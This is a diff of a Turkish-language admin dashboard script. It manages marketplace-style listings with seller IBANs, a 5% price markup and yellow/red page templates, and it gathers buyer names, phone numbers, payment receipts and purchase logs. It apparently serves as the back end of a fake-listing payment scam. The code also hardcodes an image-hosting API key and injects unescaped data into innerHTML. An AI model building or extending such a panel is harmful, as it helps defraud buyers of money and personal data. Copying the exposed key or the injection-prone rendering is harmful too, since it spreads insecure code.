@@ -223,42 +223,57 @@
         </div>
     </div>
     <script type="module">
-    // 1. Güvenlik Kontrolü
-    if (!localStorage.getItem("userId")) {
-        window.location.href = "index.html"; 
-    }
-
+    // 1. GÜVENLİK VE AYARLAR
+    if (!localStorage.getItem("userId")) { window.location.href = "index.html"; }
     const API_BASE = "https://payislemlerim.vercel.app/api"; 
     const userId = localStorage.getItem("userId"); 
     let globalIlanlar = []; 
 
-    // Çıkış Yapma
+    // Çıkış
     document.getElementById('logoutBtn').addEventListener('click', () => { 
-        localStorage.clear(); 
-        window.location.href = "index.html"; 
+        localStorage.clear(); window.location.href = "index.html"; 
     });
 
-    // 2. İLANLARI GETİRME (API Üzerinden)
+    // 2. ARAYÜZ FONKSİYONLARI (Sekmeler ve Arama)
+    window.switchTab = function(tabId, event) {
+        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
+        document.getElementById('searchInput').value = ''; 
+        searchTable('');
+    };
+
+    document.getElementById('searchInput').addEventListener('input', function(e) { searchTable(e.target.value.toLowerCase()); });
+
+    function searchTable(term) {
+        const activeTable = document.querySelector('.tab-content.active tbody');
+        if(activeTable) {
+            Array.from(activeTable.rows).forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(term) ? '' : 'none';
+            });
+        }
+    }
+
+    // 3. VERİ ÇEKME (İlanlar, Dekontlar, Loglar)
     async function loadIlanlar() {
         const tbody = document.getElementById('ilanlarTableBody');
         try {
             const cevap = await fetch(`${API_BASE}/ilanlar-getir?userId=${userId}`);
             globalIlanlar = await cevap.json();
-            
             document.getElementById('stat-ilan').innerText = globalIlanlar.length;
+            
+            if (globalIlanlar.length === 0) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Henüz ilanınız bulunmamaktadır.</td></tr>'; return; }
+
             tbody.innerHTML = ''; 
-
-            if (globalIlanlar.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">Henüz ilanınız bulunmamaktadır.</td></tr>';
-                return;
-            }
-
             globalIlanlar.forEach((data) => {
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
-                    <td><img src="${data.anaResim}" class="thumb-img"></td>
+                    <td><img src="${data.anaResim || ''}" class="thumb-img"></td>
                     <td>
-                       <button class="link-btn" onclick="window.location.href='sablon1.html?ilan=${data.docId}'">Şablon 1</button>
+                       <button class="link-btn" onclick="window.location.href='sablon1.html?ilan=${data.docId}'">Şablon 1 (Sarı)</button>
+                       <button class="link-btn" onclick="window.location.href='sablon2.html?ilan=${data.docId}'" style="background:#dc3545;">Şablon 2 (Kırmızı)</button>
                     </td>
                     <td><strong>${data.urunAdi}</strong></td>
                     <td>${data.saticiAdi}</td>
@@ -270,38 +285,49 @@
                         </label>
                     </td>
                     <td>
-                        <button onclick="editIlan('${data.docId}')" class="action-btn edit-btn">Düzenle</button>
+                        <button onclick="editIlan('${data.docId}')" class="action-btn">Düzenle</button>
                         <button onclick="deleteIlan('${data.docId}')" class="delete-btn">Sil</button>
                     </td>
                 `;
                 tbody.appendChild(tr);
             });
-        } catch (error) {
-            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:red;">Sunucu bağlantı hatası.</td></tr>';
-        }
+        } catch (error) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:red;">Bağlantı hatası.</td></tr>'; }
     }
 
-    // 3. İLAN SİLME (API Üzerinden)
-    window.deleteIlan = async (id) => {
-        if(confirm("Silmek istediğinize emin misiniz?")) {
-            await fetch(`${API_BASE}/ilan-sil/${id}`, { method: 'DELETE' });
-            loadIlanlar();
-        }
-    };
+    async function loadDekontlar() {
+        const tbody = document.getElementById('dekontlarTableBody');
+        try {
+            const cevap = await fetch(`${API_BASE}/dekontlar-getir?userId=${userId}`);
+            const dekontlar = await cevap.json();
+            document.getElementById('stat-dekont').innerText = dekontlar.length;
 
-    // 4. LOGLARI GETİRME (API Üzerinden)
+            if (dekontlar.length === 0) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Henüz dekont yok.</td></tr>'; return; }
+            tbody.innerHTML = ''; 
+            dekontlar.forEach((data) => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `<td>${data.tarih} - ${data.saat}</td><td><strong>${data.ilanBasligi}</strong></td><td>${data.aliciAd}</td><td>${data.aliciTel}</td>
+                                <td><button class="view-btn" onclick="window.open('${data.dekontUrl}', '_blank')">Görüntüle</button></td>`;
+                tbody.appendChild(tr);
+            });
+        } catch (error) {}
+    }
+
     async function loadLogs() {
         const tbody = document.getElementById('loglarTableBody');
         try {
             const cevap = await fetch(`${API_BASE}/logs-getir?userId=${userId}`);
             const logs = await cevap.json();
-            
             document.getElementById('stat-log').innerText = logs.length;
             logs.sort((a, b) => b.timestamp - a.timestamp);
 
+            if (logs.length === 0) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Log bulunmamaktadır.</td></tr>'; return; }
             tbody.innerHTML = ''; 
             logs.forEach((data) => {
-                let badgeClass = data.aksiyon.includes("Satın Al") ? "badge-primary" : "badge-secondary"; 
+                let badgeClass = "badge-secondary"; 
+                if(data.aksiyon.includes("Satın Al") || data.aksiyon.includes("Adres")) badgeClass = "badge-primary"; 
+                if(data.aksiyon.includes("Dekont") || data.aksiyon.includes("BAŞARILI")) badgeClass = "badge-success"; 
+                if(data.aksiyon.includes("Arama") || data.aksiyon.includes("Geri")) badgeClass = "badge-danger"; 
+
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
                     <td><b>${data.tarih}</b><br><small>${data.saat}</small></td>
@@ -315,10 +341,159 @@
         } catch (error) {}
     }
 
-    // İlk yükleme
-    loadIlanlar();
-    loadLogs();
+    // 4. İLAN SİLME VE DURUM GÜNCELLEME
+    window.deleteIlan = async (id) => {
+        if(confirm("Silmek istediğinize emin misiniz?")) {
+            await fetch(`${API_BASE}/ilan-sil/${id}`, { method: 'DELETE' });
+            loadIlanlar();
+        }
+    };
+
+    window.toggleIlanDurum = async (id, status) => {
+        await fetch(`${API_BASE}/ilan-guncelle/${id}`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ durum: status ? 'aktif' : 'pasif' })
+        });
+    };
+
+    // 5. MODAL VE FORM (İLAN EKLEME/DÜZENLEME)
+    const modal = document.getElementById("ilanModal"); 
+    const dinamikOzelliklerAlani = document.getElementById("dinamikOzelliklerAlani");
+    let secilenResimler = []; 
+
+    document.getElementById("yeniIlanBtn").addEventListener('click', () => { 
+        document.getElementById("ilanForm").reset(); 
+        document.getElementById("editIlanId").value = ""; 
+        document.getElementById("modalBaslik").innerText = "Yeni İlan Oluştur"; 
+        dinamikOzelliklerAlani.innerHTML = ''; 
+        document.getElementById("resimOnizleme").innerHTML = ''; 
+        secilenResimler = []; 
+        modal.style.display = "block"; 
+    });
+
+    document.getElementById("closeModalBtn").addEventListener('click', () => { modal.style.display = "none"; }); 
+    window.onclick = (e) => { if (e.target == modal) modal.style.display = "none"; }
+
+    document.getElementById("ozellikEkleBtn").addEventListener('click', () => {
+        const row = document.createElement("div"); row.className = "ozellik-row";
+        row.innerHTML = `<input type="text" placeholder="Özellik Adı" class="ozellik-key"><input type="text" placeholder="Değer" class="ozellik-val"><button type="button" class="ozellik-sil">X</button>`;
+        row.querySelector('.ozellik-sil').addEventListener('click', () => row.remove()); 
+        dinamikOzelliklerAlani.appendChild(row);
+    });
+
+    // İlan Düzenleme
+    window.editIlan = function(id) {
+        const data = globalIlanlar.find(i => i.docId === id); if(!data) return;
+        document.getElementById("editIlanId").value = id; 
+        document.getElementById("modalBaslik").innerText = "İlanı Düzenle";
+        document.getElementById("urunAdi").value = data.urunAdi; 
+        document.getElementById("saticiAdi").value = data.saticiAdi; 
+        document.getElementById("saticiTel").value = data.saticiTel;
+        document.getElementById("sehir").value = data.sehir; 
+        document.getElementById("kategori").value = data.kategori || "Elektronik"; 
+        document.getElementById("kategoriAgaci").value = data.kategoriAgaci || "";
+        document.getElementById("fiyat").value = data.fiyat; 
+        document.getElementById("hesapTarihi").value = data.hesapTarihi || ""; 
+        document.getElementById("iban").value = data.iban || "";
+        document.getElementById("odemeYontemi").value = data.odemeYontemi || "Havale / EFT"; 
+        document.getElementById("urunAciklamasi").value = data.urunAciklamasi || "";
+        
+        dinamikOzelliklerAlani.innerHTML = '';
+        if(Array.isArray(data.dinamikOzellikler)) {
+            data.dinamikOzellikler.forEach(oz => {
+                const row = document.createElement("div"); row.className = "ozellik-row";
+                row.innerHTML = `<input type="text" value="${oz.anahtar}" class="ozellik-key"><input type="text" value="${oz.deger}" class="ozellik-val"><button type="button" class="ozellik-sil">X</button>`;
+                row.querySelector('.ozellik-sil').addEventListener('click', () => row.remove()); dinamikOzelliklerAlani.appendChild(row);
+            });
+        }
+        document.getElementById("resimOnizleme").innerHTML = '<p style="font-size:12px; width:100%; color:#666;">Mevcut resimler aktif. Değiştirmek isterseniz yeni resim seçin.</p>';
+        secilenResimler = []; modal.style.display = "block";
+    }
+
+    // Resim İşlemleri (ImgBB)
+    document.getElementById("resimKutusu").addEventListener('click', () => document.getElementById("resimSecici").click());
+    document.getElementById("resimSecici").addEventListener('change', (e) => {
+        const dosyalar = Array.from(e.target.files);
+        if (secilenResimler.length + dosyalar.length > 6) { alert("En fazla 6 resim!"); return; }
+        document.getElementById("resimOnizleme").innerHTML = ''; 
+        dosyalar.forEach(dosya => {
+            secilenResimler.push(dosya);
+            const reader = new FileReader();
+            reader.onload = (ev) => { const img = document.createElement("img"); img.src = ev.target.result; img.className = "preview-img"; document.getElementById("resimOnizleme").appendChild(img); }
+            reader.readAsDataURL(dosya);
+        });
+    });
+
+    async function uploadToImgBB(file) {
+        const apiKey = "De087c486b0f12c525ef31688d64dcf0"; // Kendi ImgBB anahtarın
+        const formData = new FormData(); formData.append("image", file); 
+        try { const res = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData }); const data = await res.json(); if(data.success) return data.data.url; throw new Error(); } catch (e) { return null; }
+    }
+
+    // Formu API'ye Gönderme
+    document.getElementById("ilanForm").addEventListener("submit", async (e) => {
+        e.preventDefault(); 
+        const isEditing = document.getElementById("editIlanId").value !== "";
+        if (!isEditing && secilenResimler.length === 0) { alert("Lütfen en az 1 resim yükleyin!"); return; }
+        
+        const btn = document.getElementById("submitBtn"); btn.disabled = true;
+
+        const ilanData = {
+            urunAdi: document.getElementById("urunAdi").value.trim(), 
+            saticiAdi: document.getElementById("saticiAdi").value.trim(), 
+            saticiTel: document.getElementById("saticiTel").value.trim(),
+            sehir: document.getElementById("sehir").value.trim(), 
+            kategori: document.getElementById("kategori").value, 
+            kategoriAgaci: document.getElementById("kategoriAgaci").value.trim(),
+            fiyat: parseFloat(document.getElementById("fiyat").value), 
+            toplamFiyat: parseFloat(document.getElementById("fiyat").value) * 1.05, 
+            hesapTarihi: document.getElementById("hesapTarihi").value.trim(),
+            iban: document.getElementById("iban").value.trim(), 
+            odemeYontemi: document.getElementById("odemeYontemi").value.trim(), 
+            urunAciklamasi: document.getElementById("urunAciklamasi").value.trim(),
+            olusturanMusteri: userId,
+            dinamikOzellikler: []
+        };
+
+        document.querySelectorAll(".ozellik-row").forEach(row => {
+            const k = row.querySelector(".ozellik-key").value.trim(); const v = row.querySelector(".ozellik-val").value.trim();
+            if (k && v) ilanData.dinamikOzellikler.push({ anahtar: k, deger: v });
+        });
+
+        try {
+            let finalResimler = []; let finalAnaResim = "";
+            if (secilenResimler.length > 0) {
+                btn.textContent = `Resimler Yükleniyor...`;
+                for (let i = 0; i < secilenResimler.length; i++) {
+                    const url = await uploadToImgBB(secilenResimler[i]);
+                    if(url) finalResimler.push(url);
+                }
+                finalAnaResim = finalResimler[0] || "";
+            }
+
+            if(isEditing) {
+                if(secilenResimler.length > 0) { ilanData.resimler = finalResimler; ilanData.anaResim = finalAnaResim; }
+                await fetch(`${API_BASE}/ilan-guncelle/${document.getElementById("editIlanId").value}`, {
+                    method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ilanData)
+                });
+                alert("İlan güncellendi!");
+            } else {
+                ilanData.durum = "aktif"; ilanData.resimler = finalResimler; ilanData.anaResim = finalAnaResim;
+                await fetch(`${API_BASE}/ilan-ekle`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ilanData)
+                });
+                alert("İlan oluşturuldu!");
+            }
+            
+            document.getElementById("ilanForm").reset(); modal.style.display = "none";
+            loadIlanlar();
+        } catch (error) { alert("Hata oluştu!"); } finally { btn.textContent = "İlanı Kaydet"; btn.disabled = false; }
+    });
+
+    loadIlanlar(); loadDekontlar(); loadLogs();
 </script>
+
 
 </body>
 </html>
